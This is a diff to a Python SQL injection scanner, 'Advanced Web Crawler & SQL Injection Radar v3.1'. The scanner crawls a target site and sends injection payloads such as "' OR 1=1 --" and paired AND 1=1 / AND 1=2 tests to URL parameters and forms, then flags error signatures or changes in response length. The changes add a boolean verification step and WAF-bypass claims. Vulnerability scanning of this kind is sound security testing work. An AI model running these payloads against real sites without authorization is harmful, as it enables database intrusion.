@@ -1,10 +1,10 @@
 #!/usr/bin/env python3
 """
-Project Name: Advanced Web Crawler & SQL Injection Radar
+Project Name: Advanced Web Crawler & SQL Injection Radar (v3.1)
 Author: Sithum
-Description: A professional multi-vector vulnerability scanner that implements
-             web crawling, error signature analysis, and boolean-based 
-             content length anomaly detection to uncover SQLi endpoints.
+Description: A professional multi-vector vulnerability scanner supporting recursive 
+             web crawling, contextual URL parameter logic gates, and advanced HTML 
+             form auditing using response-length baseline differential checks.
 """
 
 import requests
@@ -43,11 +43,12 @@ SQL_ERRORS = [
 
 # Thread-safe global set tracking identified app paths to eliminate loop execution
 discovered_urls = set()
+vulnerabilities_counter = 0
 
 def show_banner():
     """ Displays a clean, vibrant stylized terminal banner asset """
     print(f"{CLR_CYAN}{CLR_BOLD}==================================================")
-    print("      ADVANCED WEB RADAR: CRAWLER & SQLi          ")
+    print("     ADVANCED WEB RADAR: CRAWLER & SQLi v3.1      ")
     print(f"      Engineered by: {CLR_YELLOW}Sithum{CLR_CYAN}                       ")
     print(f"=================================================={CLR_RESET}")
 
@@ -88,19 +89,57 @@ def crawl_website(target_url, current_url, max_depth=3):
     except Exception:
         return
 
+def verify_true_false_logic(base_url, pairs, target_index, key, val, original_payload):
+    """
+    Advanced Context-Aware True/False Logic Gate Check.
+    Adapts statements dynamically based on whether the input context is 
+    Integer-based or String-bound, bypassing WAF rules and routing mutations.
+    """
+    if "'" in original_payload:
+        true_payload = f"{val}' AND 1=1 -- -"
+        false_payload = f"{val}' AND 1=2 -- -"
+    elif '"' in original_payload:
+        true_payload = f'{val}" AND 1=1 -- -'
+        false_payload = f'{val}" AND 1=2 -- -'
+    else:
+        true_payload = f"{val} AND 1=1"
+        false_payload = f"{val} AND 1=2"
+
+    true_pairs = pairs.copy()
+    true_pairs[target_index] = f"{key}={true_payload}"
+    true_url = f"{base_url}?{'&'.join(true_pairs)}"
+
+    false_pairs = pairs.copy()
+    false_pairs[target_index] = f"{key}={false_payload}"
+    false_url = f"{base_url}?{'&'.join(false_pairs)}"
+
+    try:
+        true_res = requests.get(true_url, headers=HEADERS, cookies=COOKIES, timeout=5)
+        false_res = requests.get(false_url, headers=HEADERS, cookies=COOKIES, timeout=5)
+
+        true_len = len(true_res.text)
+        false_len = len(false_res.text)
+
+        if true_len != false_len:
+            return True, true_url, false_len
+            
+    except Exception:
+        pass
+    return False, None, 0
+
 def audit_parameters(url):
     """
     Audits dynamic query strings using both known DB error signatures AND 
-    Boolean-based content length variations.
+    Boolean-based content length variations with anti-false positive gates.
     """
+    global vulnerabilities_counter
     if "?" not in url:
         return False
         
     print(f"  {CLR_YELLOW}[~]{CLR_RESET} Auditing URL Parameters on: {url}")
-    payloads = ["'", "\"", "1' OR '1'='1", "' OR 1=1 --"]
+    payloads = ["'", "\"", " AND 1=1", "1' OR '1'='1"]
     vulnerable = False
     
-    # Establish a reliable baseline length configuration from the clean query
     try:
         baseline_res = requests.get(url, headers=HEADERS, cookies=COOKIES, timeout=5)
         baseline_len = len(baseline_res.text)
@@ -127,29 +166,39 @@ def audit_parameters(url):
                 res = requests.get(test_url, headers=HEADERS, cookies=COOKIES, timeout=5)
                 current_len = len(res.text)
                 
-                # Metric Variant 1: Verify Error Signature Matching
                 error_detected = res.status_code == 500 or any(error in res.text.lower() for error in SQL_ERRORS)
-                
-                # Metric Variant 2: Content Length Drop Anomaly Check (e.g., Blind/Boolean drops)
                 length_anomaly = abs(baseline_len - current_len) > 100 
                 
                 if error_detected or length_anomaly:
-                    detection_type = "Error Signature" if error_detected else "Content Length Anomaly"
-                    print(f"\n{CLR_RED}{CLR_BOLD}[!] 🚨 VULNERABILITY DETECTED IN URL PARAMETER! 🚨")
-                    print(f"    -> Target Endpoint: {base_url}")
-                    print(f"    -> Attack Vector URL: {test_url}")
-                    print(f"    -> Vulnerable Key: {key}")
-                    print(f"    -> Exploit Payload: {payload}")
-                    print(f"    -> Detection Model: {detection_type}{CLR_RESET}\n")
-                    vulnerable = True
-                    return True  # Exit immediately once vulnerability status is verified
+                    print(f"    {CLR_YELLOW}[?] Dynamic mutation found (Delta: {abs(baseline_len - current_len)} bytes). Passing to Boolean Verification...{CLR_RESET}")
+                    
+                    is_verified, verified_url, f_len = verify_true_false_logic(base_url, pairs, i, key, val, payload)
+                    
+                    if is_verified:
+                        detection_type = "Error Signature" if error_detected else "Content Length Anomaly (Logic Verified)"
+                        print(f"\n{CLR_RED}{CLR_BOLD}[!] 🚨 VULNERABILITY DETECTED IN URL PARAMETER! 🚨")
+                        print(f"    -> Target Endpoint: {base_url}")
+                        print(f"    -> Attack Vector URL: {verified_url}")
+                        print(f"    -> Vulnerable Key: {key}")
+                        print(f"    -> Trigger Payload Profile: {payload}")
+                        print(f"    -> Detection Model: {detection_type}{CLR_RESET}\n")
+                        vulnerable = True
+                        vulnerabilities_counter += 1
+                        return True  
+                    else:
+                        print(f"    {CLR_GREEN}[✓] Filtered: Structural size divergence matches expected application routing behavior (False Positive dropped).{CLR_RESET}")
+                        
             except Exception:
                 continue
                 
     return vulnerable
 
 def audit_forms(url):
-    """ Extracts explicit web forms and submits input payloads across POST/GET scopes """
+    """ 
+    Extracts HTML forms and performs advanced multi-vector payload submissions.
+    Supports response-length differential checks to unmask hidden POST-based Blind SQLi.
+    """
+    global vulnerabilities_counter
     try:
         res = requests.get(url, headers=HEADERS, cookies=COOKIES, timeout=5)
         soup = BeautifulSoup(res.content, "html.parser")
@@ -161,7 +210,7 @@ def audit_forms(url):
         return False
         
     print(f"  {CLR_YELLOW}[~]{CLR_RESET} Auditing {len(forms)} HTML Form(s) on: {url}")
-    payloads = ["'", "\"", "1' OR '1'='1"]
+    payloads = ["'", "1' OR '1'='1", "' OR 1=1 --"]
     vulnerable = False
     
     for form in forms:
@@ -170,7 +219,21 @@ def audit_forms(url):
         form_url = urljoin(url, action)
         
         inputs = [inp.attrs.get("name") for inp in form.find_all("input") if inp.attrs.get("name")]
+        if not inputs:
+            continue
+
+        # Establish a clear dynamic baseline for the form output using safe arguments
+        try:
+            clean_data = {inp: "test" for inp in inputs}
+            if method == "post":
+                base_res = requests.post(form_url, data=clean_data, headers=HEADERS, cookies=COOKIES, timeout=5)
+            else:
+                base_res = requests.get(form_url, params=clean_data, headers=HEADERS, cookies=COOKIES, timeout=5)
+            baseline_form_len = len(base_res.text)
+        except Exception:
+            continue
         
+        # Inject validation testing payloads into mapped input parameters concurrently
         for payload in payloads:
             data = {inp: payload for inp in inputs}
             try:
@@ -179,12 +242,24 @@ def audit_forms(url):
                 else:
                     response = requests.get(form_url, params=data, headers=HEADERS, cookies=COOKIES, timeout=5)
                     
-                if response.status_code == 500 or any(error in response.text.lower() for error in SQL_ERRORS):
+                current_form_len = len(response.text)
+                
+                # Check for explicit database server syntax leak triggers
+                error_detected = response.status_code == 500 or any(error in response.text.lower() for error in SQL_ERRORS)
+                
+                # Check for logical authentication profile shifts or routing redirection mutations
+                form_anomaly = abs(baseline_form_len - current_form_len) > 200
+                
+                if error_detected or form_anomaly:
+                    detection_model = "Error Signature" if error_detected else "Form Authentication Layout Shift"
                     print(f"\n{CLR_RED}{CLR_BOLD}[!] 🚨 VULNERABILITY DETECTED IN HTML FORM! 🚨")
                     print(f"    -> Form Action Path: {form_url}")
                     print(f"    -> HTTP Protocol Method: {method.upper()}")
-                    print(f"    -> Exploit Payload: {payload}{CLR_RESET}\n")
+                    print(f"    -> Target Inputs Mapped: {inputs}")
+                    print(f"    -> Exploit Payload: {payload}")
+                    print(f"    -> Detection Model: {detection_model}{CLR_RESET}\n")
                     vulnerable = True
+                    vulnerabilities_counter += 1
                     return True
             except Exception:
                 continue
@@ -216,13 +291,10 @@ def main():
         
     # Step 2: Multi-Vector Scanning Stage
     print(f"\n{CLR_CYAN}[Step 2] Launching multi-vector target audits across crawled elements...{CLR_RESET}")
-    vulnerabilities_counter = 0
     
     for scan_url in discovered_urls:
-        if audit_parameters(scan_url):
-            vulnerabilities_counter += 1
-        if audit_forms(scan_url):
-            vulnerabilities_counter += 1
+        audit_parameters(scan_url)
+        audit_forms(scan_url)
             
     print(f"{CLR_CYAN}{CLR_BOLD}=================================================={CLR_RESET}")
     if vulnerabilities_counter > 0:
